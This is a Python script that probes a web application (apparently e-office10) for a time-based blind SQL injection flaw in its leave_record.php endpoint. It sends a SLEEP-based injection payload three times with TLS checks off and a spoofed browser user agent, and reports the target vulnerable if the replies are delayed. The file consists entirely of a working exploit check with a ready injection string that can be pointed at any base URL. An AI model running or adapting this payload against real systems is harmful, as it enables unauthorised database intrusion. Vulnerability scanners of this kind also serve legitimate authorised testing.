import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"eoffice10/server/ext/system_support/leave_record.php?flow_id=1&run_id=1%27)%20AND%20(SELECT%208077%20FROM%20(SELECT(SLEEP(6)))viED)%23&table_field=user()&table_field_name=xxx&max_rows=10"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=15,verify=False)
	if response.elapsed.total_seconds() >= 5 and response.status_code == 200 and re.search("function[\\s]*(\\S+)?\\((\\S+)?\\)[\\s]*\\{",response.text):
		r0=True
	else:
		r0=False
	url=baseurl+"eoffice10/server/ext/system_support/leave_record.php?flow_id=1&run_id=1%27)%20AND%20(SELECT%208077%20FROM%20(SELECT(SLEEP(6)))viED)%23&table_field=user()&table_field_name=xxx&max_rows=10"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=15,verify=False)
	if response.elapsed.total_seconds() >=5 and response.status_code == 200 and re.search("function[\\s]*(\\S+)?\\((\\S+)?\\)[\\s]*\\{",response.text):
		r1=True
	else:
		r1=False
	url=baseurl+"eoffice10/server/ext/system_support/leave_record.php?flow_id=1&run_id=1%27)%20AND%20(SELECT%208077%20FROM%20(SELECT(SLEEP(6)))viED)%23&table_field=user()&table_field_name=xxx&max_rows=10"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=15,verify=False)
	if response.elapsed.total_seconds() >=5 and response.status_code == 200 and re.search("function[\\s]*(\\S+)?\\((\\S+)?\\)[\\s]*\\{",response.text):
		r3=True
	else:
		r3=False
	if r0 and r1 and r3:
		return True
	else:
		return False
